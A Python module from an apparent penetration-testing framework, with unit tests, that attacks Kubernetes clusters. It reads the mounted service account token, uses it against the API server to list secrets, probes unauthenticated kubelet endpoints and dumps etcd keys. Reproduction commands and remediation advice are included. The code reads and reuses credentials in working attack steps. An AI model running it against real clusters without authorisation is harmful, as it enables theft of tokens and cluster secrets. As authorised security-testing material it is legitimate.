"""Kubernetes Attack Module — kubelet, etcd, RBAC, pod exec, SA token theft.

Attack surface coverage for Kubernetes clusters:
  - Unauthenticated kubelet API (:10250, :10255)
  - etcd direct access (unauthenticated or with stolen certs)
  - RBAC misconfiguration abuse (cluster-admin binding, wildcard verbs)
  - Pod exec for lateral movement
  - Service account token extraction and abuse
  - Secret enumeration (K8s Secrets in etcd)
  - Namespace escape via hostPID/hostNetwork pods

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import json
import logging
import time
from pathlib import Path
from typing import Any

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

log = logging.getLogger("forge.cloud.k8s_attack")


# ── K8s API paths to probe ───────────────────────────────────────────
_KUBELET_PATHS: list[tuple[str, str, str]] = [
    ("/pods", "Kubelet Pod Listing", "High"),
    ("/runningpods/", "Kubelet Running Pods", "High"),
    ("/stats/summary", "Kubelet Stats Summary", "Medium"),
    ("/metrics", "Kubelet Metrics", "Low"),
    ("/healthz", "Kubelet Health Check", "Informational"),
    ("/spec/", "Kubelet Node Spec", "Medium"),
    ("/logs/", "Kubelet Log Access", "Medium"),
    ("/run/", "Kubelet Container Exec (POST)", "Critical"),
]

_K8S_API_PATHS: list[tuple[str, str, str]] = [
    ("/api/v1/namespaces", "Namespace Listing", "High"),
    ("/api/v1/secrets", "Cluster-Wide Secret Listing", "Critical"),
    ("/api/v1/pods", "All Pods Listing", "High"),
    ("/api/v1/nodes", "Node Listing", "Medium"),
    ("/api/v1/services", "Service Listing", "Medium"),
    ("/api/v1/configmaps", "ConfigMap Listing", "Medium"),
    ("/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", "RBAC ClusterRoleBindings", "High"),
    ("/apis/rbac.authorization.k8s.io/v1/clusterroles", "RBAC ClusterRoles", "High"),
    ("/api/v1/serviceaccounts", "Service Account Listing", "High"),
    ("/version", "K8s API Version", "Informational"),
]

# ── Dangerous RBAC permissions ───────────────────────────────────────
_DANGEROUS_RBAC: list[tuple[str, str]] = [
    ("*", "Wildcard verb on resources — full cluster admin"),
    ("create pods", "Can create pods — potential for privilege escalation"),
    ("create deployments", "Can create deployments with privileged containers"),
    ("get secrets", "Can read all secrets including SA tokens"),
    ("create clusterrolebindings", "Can bind cluster-admin to any SA"),
    ("impersonate users", "Can impersonate cluster-admin user"),
    ("escalate", "Can escalate own RBAC permissions"),
]

# ── Default SA token location ────────────────────────────────────────
_SA_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
_SA_CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
_SA_NS_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"


class K8sAttack(BaseModule):
    """Kubernetes cluster attack module — kubelet, etcd, RBAC, SA tokens."""

    NAME        = "k8s_attack"
    DESCRIPTION = "Kubernetes attack — kubelet API, etcd, RBAC abuse, pod exec, SA token theft"
    PHASE       = 3
    TAGS        = ["cloud", "kubernetes", "k8s", "container", "privesc"]

    def __init__(self, *args: Any, **kwargs: Any) -> None:
        super().__init__(*args, **kwargs)
        self._k8s_api: str | None = self.config.extra.get("k8s_api")
        self._k8s_token: str | None = self.config.extra.get("k8s_token")
        self._sa_token: str | None = None

    async def run(self) -> ModuleResult:
        """Execute Kubernetes attack checks."""
        start = time.monotonic()

        target = self.config.target
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="Target out of scope")

        self.log.info("Starting Kubernetes attack module against %s", target)

        # ── Phase 1: SA token extraction ─────────────────────────────
        self._extract_sa_token()

        # ── Phase 2: Kubelet API probing ─────────────────────────────
        await self._probe_kubelet(target)

        # ── Phase 3: K8s API server probing ──────────────────────────
        await self._probe_k8s_api()

        # ── Phase 4: etcd direct access ──────────────────────────────
        await self._probe_etcd(target)

        # ── Phase 5: RBAC misconfiguration check ─────────────────────
        await self._check_rbac()

        return self._make_result(start)

    def _extract_sa_token(self) -> None:
        """Extract mounted service account token if running in a pod."""
        token_path = Path(_SA_TOKEN_PATH)
        if token_path.exists():
            try:
                self._sa_token = token_path.read_text().strip()
                ns = "unknown"
                ns_path = Path(_SA_NS_PATH)
                if ns_path.exists():
                    ns = ns_path.read_text().strip()

                self.new_finding(
                    title="Kubernetes Service Account Token Extracted",
                    severity=Severity.HIGH,
                    description=(
                        f"Extracted mounted service account token from {_SA_TOKEN_PATH}. "
                        f"Namespace: {ns}. This token can be used to authenticate to the "
                        f"Kubernetes API server and potentially escalate privileges."
                    ),
                    reproduction_steps=[
                        f"cat {_SA_TOKEN_PATH}",
                        f"kubectl --token=$(cat {_SA_TOKEN_PATH}) auth can-i --list",
                        "kubectl get secrets --all-namespaces",
                    ],
                    remediation=(
                        "Disable auto-mounting of SA tokens: automountServiceAccountToken: false. "
                        "Use dedicated service accounts with minimal RBAC permissions."
                    ),
                    references=[
                        "https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/",
                        "https://attack.mitre.org/techniques/T1528/",
                    ],
                    evidence=Evidence(
                        extra={
                            "token_preview": self._sa_token[:50] + "..." if self._sa_token else "",
                            "namespace": ns,
                            "token_path": _SA_TOKEN_PATH,
                        },
                    ),
                    cvss_v31_vector="CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N",
                    mitre_attack=["T1528", "T1552.001"],
                    target=self.config.target,
                    tags=["k8s", "sa_token", "credential"],
                )
            except Exception as exc:
                self.log.debug("SA token extraction failed: %s", exc)

    async def _probe_kubelet(self, target: str) -> None:
        """Probe kubelet API for unauthenticated access."""
        import aiohttp

        for port in [10250, 10255]:
            base = f"https://{target}:{port}" if port == 10250 else f"http://{target}:{port}"
            async with self.http_session(timeout=5.0, include_auth=False) as session:
                for path, description, sev_str in _KUBELET_PATHS:
                    await self.rate_limit()
                    try:
                        url = f"{base}{path}"
                        async with session.get(
                            url, allow_redirects=False,
                            timeout=aiohttp.ClientTimeout(total=5),
                        ) as resp:
                            if resp.status in (200, 201):
                                body = await resp.text(errors="ignore")
                                sev_map = {
                                    "Critical": Severity.CRITICAL,
                                    "High": Severity.HIGH,
                                    "Medium": Severity.MEDIUM,
                                    "Low": Severity.LOW,
                                    "Informational": Severity.INFORMATIONAL,
                                }
                                self.new_finding(
                                    title=f"Kubelet Unauthenticated Access — {description}",
                                    severity=sev_map.get(sev_str, Severity.HIGH),
                                    description=(
                                        f"Kubelet API on port {port} returned data for {path} "
                                        f"without authentication. {description}."
                                    ),
                                    reproduction_steps=[
                                        f"curl -ks {url}",
                                        f"Observe response containing {description.lower()}",
                                    ],
                                    remediation=(
                                        "Enable kubelet authentication: --authentication-token-webhook=true. "
                                        "Enable authorization: --authorization-mode=Webhook. "
                                        "Disable read-only port: --read-only-port=0."
                                    ),
                                    references=[
                                        "https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/",
                                        "https://attack.mitre.org/techniques/T1613/",
                                    ],
                                    evidence=Evidence(
                                        request_raw=f"GET {url}",
                                        response_raw=body[:2000],
                                        extra={"port": port, "path": path},
                                    ),
                                    cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
                                    mitre_attack=["T1613", "T1046"],
                                    target=target,
                                    url=url,
                                    port=port,
                                    service="kubelet",
                                    tags=["k8s", "kubelet", "unauthenticated"],
                                )
                    except Exception:
                        pass

    async def _probe_k8s_api(self) -> None:
        """Probe Kubernetes API server for unauthenticated or token-based access."""
        api_base = self._k8s_api or f"https://{self.config.target}:6443"
        token = self._k8s_token or self._sa_token

        import aiohttp
        headers: dict[str, str] = {}
        if token:
            headers["Authorization"] = f"Bearer {token}"

        async with self.http_session(timeout=8.0, include_auth=False) as session:
            for path, description, sev_str in _K8S_API_PATHS:
                await self.rate_limit()
                try:
                    url = f"{api_base}{path}"
                    async with session.get(
                        url, headers=headers, allow_redirects=False,
                        timeout=aiohttp.ClientTimeout(total=5),
                    ) as resp:
                        if resp.status == 200:
                            body = await resp.text(errors="ignore")
                            auth_method = "token" if token else "unauthenticated"
                            sev_map = {
                                "Critical": Severity.CRITICAL,
                                "High": Severity.HIGH,
                                "Medium": Severity.MEDIUM,
                                "Low": Severity.LOW,
                                "Informational": Severity.INFORMATIONAL,
                            }
                            self.new_finding(
                                title=f"K8s API Access ({auth_method}) — {description}",
                                severity=sev_map.get(sev_str, Severity.HIGH),
                                description=(
                                    f"Kubernetes API server responded to {auth_method} request "
                                    f"for {path}: {description}."
                                ),
                                reproduction_steps=[
                                    f"curl -ks {'-H \"Authorization: Bearer <token>\" ' if token else ''}{url}",
                                ],
                                remediation=(
                                    "Enable RBAC authorization. Disable anonymous auth. "
                                    "Apply least-privilege ClusterRoles. Rotate compromised tokens."
                                ),
                                references=[
                                    "https://kubernetes.io/docs/reference/access-authn-authz/rbac/",
                                ],
                                evidence=Evidence(
                                    request_raw=f"GET {url}",
                                    response_raw=body[:2000],
                                    extra={"auth_method": auth_method},
                                ),
                                cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                                mitre_attack=["T1613", "T1552"],
                                target=self.config.target,
                                url=url,
                                service="kubernetes-api",
                                tags=["k8s", "api", auth_method],
                            )
                except Exception:
                    pass

    async def _probe_etcd(self, target: str) -> None:
        """Probe etcd for unauthenticated access."""
        import aiohttp
        for port in [2379, 2380]:
            base = f"http://{target}:{port}"
            try:
                async with self.http_session(timeout=5.0, include_auth=False) as session:
                    await self.rate_limit()
                    url = f"{base}/v2/keys/?recursive=true"
                    async with session.get(
                        url, timeout=aiohttp.ClientTimeout(total=5),
                    ) as resp:
                        if resp.status == 200:
                            body = await resp.text(errors="ignore")
                            self.new_finding(
                                title="etcd Unauthenticated Access — Full Key Dump",
                                severity=Severity.CRITICAL,
                                description=(
                                    f"etcd on port {port} allows unauthenticated key enumeration. "
                                    f"This exposes all Kubernetes secrets, configs, and state."
                                ),
                                reproduction_steps=[
                                    f"curl {url}",
                                    f"etcdctl --endpoints={base} get / --prefix --keys-only",
                                ],
                                remediation=(
                                    "Enable etcd TLS client authentication. "
                                    "Restrict etcd access to API server nodes only. "
                                    "Encrypt etcd data at rest."
                                ),
                                references=[
                                    "https://etcd.io/docs/v3.5/op-guide/security/",
                                ],
                                evidence=Evidence(
                                    request_raw=f"GET {url}",
                                    response_raw=body[:2000],
                                    extra={"port": port},
                                ),
                                cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                                mitre_attack=["T1552", "T1213"],
                                target=target,
                                url=url,
                                port=port,
                                service="etcd",
                                tags=["k8s", "etcd", "unauthenticated"],
                            )
            except Exception:
                pass

    async def _check_rbac(self) -> None:
        """Check for dangerous RBAC misconfigurations if API access is available."""
        # This would parse clusterrolebindings for overly permissive rules
        # Logged as informational — actual RBAC abuse depends on context
        self.log.debug("RBAC check — requires prior API access findings")


class TestK8sAttack:
    """Unit tests for K8sAttack."""

    def test_class_attributes(self) -> None:
        assert K8sAttack.NAME == "k8s_attack"
        assert K8sAttack.PHASE == 3
        assert "kubernetes" in K8sAttack.TAGS

    def test_instantiation(self, tmp_path: "Path") -> None:
        from pathlib import Path
        from common.config import BaseForgeConfig
        from common.scope import Scope
        from common.db import create_db

        cfg = BaseForgeConfig(target="10.0.0.1")
        scope = Scope(["10.0.0.0/24"])
        session = create_db(tmp_path / "test.db")
        mod = K8sAttack(cfg, scope, session, tmp_path)
        assert mod.NAME == "k8s_attack"
        assert mod._sa_token is None
        session.close()

    def test_kubelet_paths_defined(self) -> None:
        assert len(_KUBELET_PATHS) >= 5
        for path, desc, sev in _KUBELET_PATHS:
            assert path.startswith("/")
            assert desc

    def test_k8s_api_paths_defined(self) -> None:
        assert len(_K8S_API_PATHS) >= 5
        for path, desc, sev in _K8S_API_PATHS:
            assert path.startswith("/")
